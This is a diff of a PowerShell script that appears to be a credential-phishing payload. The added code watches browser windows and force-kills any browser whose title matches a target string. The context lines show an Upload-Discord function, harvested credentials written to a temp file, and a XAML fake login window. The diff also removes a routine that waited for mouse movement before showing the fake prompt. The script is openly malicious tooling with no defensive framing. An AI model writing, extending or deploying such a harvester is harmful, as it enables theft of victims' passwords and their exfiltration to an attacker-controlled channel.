@@ -1,4 +1,51 @@
-# Define the Upload-Discord function
+# Define the partial title you want to monitor (e.g., "TikTok")
+$targetTitle = "powerful tools"
+
+# Define a list of popular browser process names
+$browserProcesses = @("chrome", "firefox", "msedge", "opera")
+
+# Define the interval to check (in seconds)
+$checkInterval = 15
+
+# Outer loop to run continuously
+while ($true) {
+    # Loop until the condition is met
+    $conditionMet = $false
+
+    while (-not $conditionMet) {
+        foreach ($browserName in $browserProcesses) {
+            $currentBrowserProcesses = Get-Process -name $browserName -ErrorAction SilentlyContinue
+            if ($currentBrowserProcesses) {
+                foreach ($process in $currentBrowserProcesses) {
+                    try {
+                        $processTitle = $process.MainWindowTitle
+                        Write-Host "$browserName - Window Title: $processTitle"
+                        if ($processTitle -like "*$targetTitle*") {
+                            Write-Host "Detected TikTok in $browserName. Closing..."
+                            Stop-Process -Id $process.Id -Force
+                            $conditionMet = $true  # Set the flag to true when the condition is met
+                            break 2  # Exit both inner and outer loops when the condition is met
+                        }
+                    } catch {
+                        # Handle any exceptions that might occur (e.g., due to missing access permissions)
+                    }
+                }
+            }
+        }
+
+        if ($conditionMet) {
+            break  # Exit the outer loop when the condition is met
+        }
+
+        # Sleep for the specified interval (in seconds) before checking again
+        Start-Sleep -Seconds $checkInterval
+    }
+}
+
+# Continue with the rest of your script here
+Write-Host "The condition is met. Continue with the rest of your code here."
+
+
 
 
 function Upload-Discord {
@@ -31,49 +78,6 @@ $creds | Out-File -FilePath "$env:TEMP\$FileName" -Encoding utf8
 Add-Type -AssemblyName PresentationCore, PresentationFramework, WindowsBase
 
 
-
-function Pause-Script{
-Add-Type -AssemblyName System.Windows.Forms
-$originalPOS = [System.Windows.Forms.Cursor]::Position.X
-$o=New-Object -ComObject WScript.Shell
-
-    while (1) {
-        $pauseTime = 3
-        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
-            break
-        }
-        else {
-            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
-        }
-    }
-}
-
-#----------------------------------------------------------------------------------------------------
-
-# This script repeadedly presses the capslock button, this snippet will make sure capslock is turned back off 
-
-function Caps-Off {
-Add-Type -AssemblyName System.Windows.Forms
-$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
-
-#If true, toggle CapsLock key, to ensure that the script doesn't fail
-if ($caps -eq $true){
-
-$key = New-Object -ComObject WScript.Shell
-$key.SendKeys('{CapsLock}')
-}
-}
-#----------------------------------------------------------------------------------------------------
-
-<#
-
-.NOTES 
-	This is to call the function to pause the script until a mouse movement is detected then activate the pop-up
-#>
-
-Pause-Script
-
-Caps-Off
 
 $browserProcesses = "chrome", "firefox", "iexplore", "edge", "opera"
 
@@ -130,10 +134,6 @@ $XAML = @"
 
 # Load the XAML and create a Window object
 $loginWindow = [Windows.Markup.XamlReader]::Load([System.Xml.XmlReader]::Create([System.IO.StringReader] $XAML))
-
-# Set the window icon using the icon file we downloaded
-$loginWindow.Icon = [System.Windows.Media.Imaging.BitmapFrame]::Create([System.Windows.Media.Imaging.BitmapImage]::new([System.Uri]::new($iconFilePath)))
-
 
 
 # Create a XML reader for the XAML
